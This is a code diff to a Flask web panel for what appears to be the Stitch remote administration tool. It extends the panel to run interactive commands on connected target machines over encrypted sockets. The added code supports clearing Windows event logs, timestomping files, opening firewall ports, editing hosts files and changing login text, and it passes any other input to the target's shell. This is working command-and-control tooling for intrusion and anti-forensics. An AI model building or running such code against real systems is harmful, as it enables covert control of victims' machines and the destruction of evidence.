@@ -556,6 +556,18 @@ def server_status():
 # ============================================================================
 # Routes - Command Execution (REAL)
 # ============================================================================
+@app.route('/api/command_definitions', methods=['GET'])
+@login_required
+def get_command_definitions():
+    """Get command definitions for interactive commands"""
+    try:
+        return jsonify({
+            'success': True,
+            'definitions': COMMAND_DEFINITIONS
+        })
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
 @app.route('/api/execute', methods=['POST'])
 @login_required
 @limiter.limit(f"{EXECUTIONS_PER_MINUTE} per minute")
@@ -565,6 +577,7 @@ def execute_command():
         data = request.json
         conn_id = data.get('connection_id')
         command = data.get('command')
+        parameters = data.get('parameters', None)  # Optional parameters for interactive commands
         
         # Server-side validation (critical for security)
         if not command:
@@ -604,8 +617,8 @@ def execute_command():
         if len(command_history) > MAX_COMMAND_HISTORY:
             command_history.pop(0)
         
-        # Execute command
-        output = execute_real_command(command, conn_id)
+        # Execute command with optional parameters
+        output = execute_real_command(command, conn_id, parameters)
         
         return jsonify({
             'success': True,
@@ -773,8 +786,14 @@ def upload_file():
         log_debug(f"Error uploading file: {str(e)}", "ERROR", "Upload")
         return jsonify({'error': str(e)}), 500
 
-def execute_real_command(command, conn_id=None):
-    """Execute command - REAL implementation, not simulated"""
+def execute_real_command(command, conn_id=None, parameters=None):
+    """Execute command - REAL implementation, not simulated
+    
+    Args:
+        command: Command string to execute
+        conn_id: Connection ID of target
+        parameters: Optional dict of parameters for interactive commands
+    """
     try:
         server = get_stitch_server()
         
@@ -807,23 +826,171 @@ def execute_real_command(command, conn_id=None):
         if not conn_aes_key:
             return f"❌ No AES encryption key found for {conn_id}.\n\nUse 'addkey' to add the key first."
         
-        # Execute command on target using stitch_lib
-        output = execute_on_target(target_socket, command, conn_aes_key, conn_id)
+        # Execute command on target using stitch_lib with parameters
+        output = execute_on_target(target_socket, command, conn_aes_key, conn_id, parameters)
         
         return output
         
     except Exception as e:
         return f"❌ Error executing command: {str(e)}"
 
-def execute_on_target(socket_conn, command, aes_key, target_ip):
-    """Execute command on target machine using proper Stitch architecture"""
+# ============================================================================
+# Command Definitions Registry - Metadata for Interactive Commands
+# ============================================================================
+COMMAND_DEFINITIONS = {
+    'firewall': {
+        'subcommands': {
+            'open': {
+                'parameters': [
+                    {'name': 'port', 'type': 'number', 'prompt': 'Enter the desired port', 'required': True},
+                    {'name': 'protocol', 'type': 'select', 'prompt': 'Enter desired type', 'options': ['TCP', 'UDP'], 'required': True},
+                    {'name': 'direction', 'type': 'select', 'prompt': 'Enter desired direction', 'options': ['IN', 'OUT'], 'required': True, 'windows_only': True}
+                ],
+                'confirmation': True,
+                'dangerous': False
+            },
+            'close': {
+                'parameters': [
+                    {'name': 'port', 'type': 'number', 'prompt': 'Enter the desired port', 'required': True},
+                    {'name': 'protocol', 'type': 'select', 'prompt': 'Enter desired type', 'options': ['TCP', 'UDP'], 'required': True},
+                    {'name': 'direction', 'type': 'select', 'prompt': 'Enter desired direction', 'options': ['in', 'out'], 'required': True, 'windows_only': True}
+                ],
+                'confirmation': True,
+                'dangerous': False
+            },
+            'allow': {
+                'parameters': [
+                    {'name': 'program', 'type': 'text', 'prompt': 'Enter the desired program to allow', 'required': True},
+                    {'name': 'rulename', 'type': 'text', 'prompt': 'Enter the name of the firewall rule', 'required': True}
+                ],
+                'confirmation': True,
+                'dangerous': False,
+                'windows_only': True
+            }
+        }
+    },
+    'hostsfile': {
+        'subcommands': {
+            'update': {
+                'parameters': [
+                    {'name': 'hostname', 'type': 'text', 'prompt': 'Enter desired hostname to add to the hosts file', 'required': True},
+                    {'name': 'ipaddress', 'type': 'text', 'prompt': 'Enter the IP address', 'required': True}
+                ],
+                'confirmation': True,
+                'dangerous': False
+            },
+            'remove': {
+                'parameters': [
+                    {'name': 'hostname', 'type': 'text', 'prompt': 'Enter desired hostname to remove from the hosts file', 'required': True}
+                ],
+                'confirmation': True,
+                'dangerous': False
+            }
+        }
+    },
+    'popup': {
+        'parameters': [
+            {'name': 'message', 'type': 'text', 'prompt': 'Message to be displayed in popup', 'required': True}
+        ],
+        'confirmation': True,
+        'dangerous': False
+    },
+    'clearev': {
+        'parameters': [],
+        'confirmation': True,
+        'dangerous': True,
+        'confirmation_message': 'Are you sure you want to clear the System, Security, and Application event logs? This is IRREVERSIBLE.'
+    },
+    'timestomp': {
+        'subcommands': {
+            'a': {
+                'parameters': [
+                    {'name': 'file', 'type': 'text', 'prompt': 'File to modify', 'required': True},
+                    {'name': 'timestamp', 'type': 'text', 'prompt': "Enter desired last accessed time ['MM/DD/YYYY HH:mm:ss']", 'required': True, 'placeholder': '01/01/2020 12:00:00'}
+                ],
+                'confirmation': True,
+                'dangerous': False
+            },
+            'c': {
+                'parameters': [
+                    {'name': 'file', 'type': 'text', 'prompt': 'File to modify', 'required': True},
+                    {'name': 'timestamp', 'type': 'text', 'prompt': "Enter desired creation time ['MM/DD/YYYY HH:mm:ss']", 'required': True, 'placeholder': '01/01/2020 12:00:00'}
+                ],
+                'confirmation': True,
+                'dangerous': False
+            },
+            'm': {
+                'parameters': [
+                    {'name': 'file', 'type': 'text', 'prompt': 'File to modify', 'required': True},
+                    {'name': 'timestamp', 'type': 'text', 'prompt': "Enter desired last modified time ['MM/DD/YYYY HH:mm:ss']", 'required': True, 'placeholder': '01/01/2020 12:00:00'}
+                ],
+                'confirmation': True,
+                'dangerous': False
+            }
+        }
+    },
+    'logintext': {
+        'parameters': [
+            {'name': 'text', 'type': 'text', 'prompt': 'Enter text to be displayed on login window', 'required': True}
+        ],
+        'confirmation': False,
+        'dangerous': False,
+        'macos_only': True
+    }
+}
+
+def parse_command_parameters(command_string):
+    """Parse command string with inline parameters like 'firewall open port=80 protocol=tcp'"""
+    parts = command_string.strip().split()
+    if not parts:
+        return None, None, {}
+    
+    cmd_name = parts[0].lower()
+    params = {}
+    subcommand = None
+    
+    # Check if second part is a subcommand or parameter
+    if len(parts) > 1:
+        if '=' not in parts[1]:
+            subcommand = parts[1].lower()
+            param_start = 2
+        else:
+            param_start = 1
+    else:
+        return cmd_name, subcommand, params
+    
+    # Parse key=value parameters
+    for part in parts[param_start:]:
+        if '=' in part:
+            key, value = part.split('=', 1)
+            params[key.lower()] = value
+    
+    return cmd_name, subcommand, params
+
+def execute_on_target(socket_conn, command, aes_key, target_ip, parameters=None):
+    """Execute command on target machine using proper Stitch architecture
+    
+    Args:
+        socket_conn: Socket connection to target
+        command: Command string to execute
+        aes_key: AES encryption key
+        target_ip: Target IP address
+        parameters: Optional dict of parameters for interactive commands
+    """
     import io
     import sys
     import signal
+    import builtins
     from contextlib import redirect_stdout
     
-    # List of interactive commands that require stdin - not supported in web interface
-    INTERACTIVE_COMMANDS = ['firewall', 'hostsfile', 'popup', 'clearev', 'timestomp', 'logintext', 'ssh', 'crackpassword']
+    # Greenlet-local storage for input queue (works with eventlet/gevent)
+    try:
+        from eventlet.corolocal import local as greenlet_local
+        execution_local = greenlet_local()
+    except ImportError:
+        # Fallback for testing/non-eventlet environments
+        import threading
+        execution_local = threading.local()
     
     try:
         # Get target info from config
@@ -859,19 +1026,91 @@ def execute_on_target(socket_conn, command, aes_key, target_ip):
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 """
         
-        # Parse command first to check if it's interactive
+        # Parse command and parameters FIRST (before any patching)
         cmd_parts = command.strip().split(maxsplit=1)
         cmd_name = cmd_parts[0].lower() if cmd_parts else ''
         cmd_args = cmd_parts[1] if len(cmd_parts) > 1 else ''
         
-        # Block interactive commands
-        if cmd_name in INTERACTIVE_COMMANDS:
-            return output_header + f"❌ Command '{cmd_name}' requires interactive input and is not supported in the web interface.\n\n💡 Use the CLI (python3 main.py) for interactive commands."
+        if parameters is None:
+            # Try parsing inline parameters from command string
+            try:
+                cmd_name_parsed, subcommand_parsed, params_parsed = parse_command_parameters(command)
+                parameters = params_parsed if params_parsed else None
+            except Exception as e:
+                return output_header + f"❌ Failed to parse command parameters: {str(e)}"
+        
+        # Validate and build input queue based on command definitions
+        input_queue = []
+        cmd_def = COMMAND_DEFINITIONS.get(cmd_name)
+        
+        if cmd_def and parameters:
+            try:
+                # Handle subcommands
+                if 'subcommands' in cmd_def:
+                    subcommand = cmd_args.split()[0] if cmd_args else None
+                    subcommand_def = cmd_def['subcommands'].get(subcommand)
+                    if subcommand_def and 'parameters' in subcommand_def:
+                        # Validate all required parameters are present
+                        for param_def in subcommand_def['parameters']:
+                            param_name = param_def['name']
+                            if param_def.get('required') and param_name not in parameters:
+                                return output_header + f"❌ Missing required parameter: {param_name}\n\nCommand: {cmd_name} {subcommand}"
+                            if param_name in parameters:
+                                value = parameters[param_name]
+                                # Basic validation
+                                if param_def['type'] == 'number':
+                                    try:
+                                        int_val = int(value)
+                                        if param_name == 'port' and not (1 <= int_val <= 65535):
+                                            return output_header + f"❌ Invalid port number: {value} (must be 1-65535)"
+                                        input_queue.append(str(int_val))
+                                    except ValueError:
+                                        return output_header + f"❌ Invalid number for {param_name}: {value}"
+                                else:
+                                    input_queue.append(str(value))
+                        # Add confirmation if required
+                        if subcommand_def.get('confirmation'):
+                            input_queue.append('y')
+                elif 'parameters' in cmd_def:
+                    # Validate all required parameters
+                    for param_def in cmd_def['parameters']:
+                        param_name = param_def['name']
+                        if param_def.get('required') and param_name not in parameters:
+                            return output_header + f"❌ Missing required parameter: {param_name}\n\nCommand: {cmd_name}"
+                        if param_name in parameters:
+                            input_queue.append(str(parameters[param_name]))
+                    # Add confirmation if required
+                    if cmd_def.get('confirmation'):
+                        input_queue.append('y')
+            except Exception as e:
+                return output_header + f"❌ Parameter validation failed: {str(e)}"
+        
+        # Greenlet-safe input mocking using coroutine-local storage
+        execution_local.input_queue = input_queue
+        execution_local.input_index = 0
+        
+        original_input = builtins.input
+        
+        def mock_input(prompt=""):
+            """Greenlet-local input mock that won't interfere with other requests"""
+            if not hasattr(execution_local, 'input_queue'):
+                return ""  # Safety fallback
+            if execution_local.input_index < len(execution_local.input_queue):
+                value = execution_local.input_queue[execution_local.input_index]
+                execution_local.input_index += 1
+                return value
+            else:
+                return ""  # Return empty instead of blocking
         
         try:
             # Set socket timeout to prevent indefinite hangs
             original_timeout = socket_conn.gettimeout()
             socket_conn.settimeout(30.0)  # 30 second timeout
+            
+            # Apply monkey-patch for input() if we have parameters
+            # CRITICAL: Must restore in finally block to prevent pollution
+            if input_queue:
+                builtins.input = mock_input
             
             # Create stitch_commands_library instance
             stlib = stitch_lib.stitch_commands_library(
@@ -999,13 +1238,56 @@ def execute_on_target(socket_conn, command, aes_key, target_ip):
                         result = stlib.receive()
                     else:
                         return output_header + "❌ Shell requires a command parameter"
+                # Interactive commands now supported with parameter queue
+                elif cmd_name == 'firewall':
+                    if not cmd_args:
+                        return output_header + "❌ Firewall requires subcommand: open/close/allow"
+                    subcommand = cmd_args.split()[0].lower()
+                    if subcommand in ['open', 'close', 'allow']:
+                        if not input_queue:
+                            return output_header + f"❌ Firewall {subcommand} requires parameters. Use inline syntax or web UI parameter form."
+                        stlib.firewall(cmd_args)
+                    else:
+                        return output_header + f"❌ Unknown firewall subcommand: {subcommand}"
+                elif cmd_name == 'hostsfile':
+                    if not cmd_args:
+                        return output_header + "❌ Hostsfile requires subcommand: update/remove"
+                    subcommand = cmd_args.split()[0].lower()
+                    if subcommand in ['update', 'remove']:
+                        if not input_queue:
+                            return output_header + f"❌ Hostsfile {subcommand} requires parameters."
+                        stlib.hostsfile(subcommand)
+                    else:
+                        return output_header + f"❌ Unknown hostsfile subcommand: {subcommand}"
+                elif cmd_name == 'popup':
+                    if not input_queue and not cmd_args:
+                        return output_header + "❌ Popup requires a message parameter"
+                    stlib.popup()
+                elif cmd_name == 'clearev':
+                    if not input_queue:
+                        return output_header + "❌ Clearev requires confirmation. Use web UI confirmation dialog."
+                    stlib.clearev()
+                elif cmd_name == 'timestomp':
+                    if not cmd_args:
+                        return output_header + "❌ Timestomp requires subcommand: a/c/m (accessed/created/modified)"
+                    subcommand = cmd_args.split()[0].lower()
+                    if subcommand in ['a', 'c', 'm']:
+                        if not input_queue:
+                            return output_header + f"❌ Timestomp {subcommand} requires file and timestamp parameters"
+                        file_arg = cmd_args.split()[1] if len(cmd_args.split()) > 1 else ''
+                        if not file_arg:
+                            return output_header + "❌ Timestomp requires file path"
+                        stlib.timestomp(subcommand, file_arg)
+                    else:
+                        return output_header + f"❌ Unknown timestomp subcommand: {subcommand}"
+                elif cmd_name == 'logintext':
+                    if not input_queue and not cmd_args:
+                        return output_header + "❌ Logintext requires a text message parameter"
+                    stlib.logintext()
                 else:
                     # For unrecognized commands, send as shell command
                     stlib.send(command)
                     result = stlib.receive()
-            
-            # Restore original timeout
-            socket_conn.settimeout(original_timeout)
             
             # Get captured output
             captured = output_buffer.getvalue()
@@ -1025,6 +1307,14 @@ def execute_on_target(socket_conn, command, aes_key, target_ip):
         except Exception as e:
             import traceback
             return output_header + f"❌ Execution error: {str(e)}\n\nType: {type(e).__name__}\n\nTraceback: {traceback.format_exc()[-500:]}"
+        finally:
+            # CRITICAL: Always restore original input() to prevent global state pollution
+            builtins.input = original_input
+            # Restore socket timeout
+            try:
+                socket_conn.settimeout(original_timeout)
+            except:
+                pass  # Socket may be closed
         
     except Exception as e:
         return f"❌ Error setting up command execution: {str(e)}"
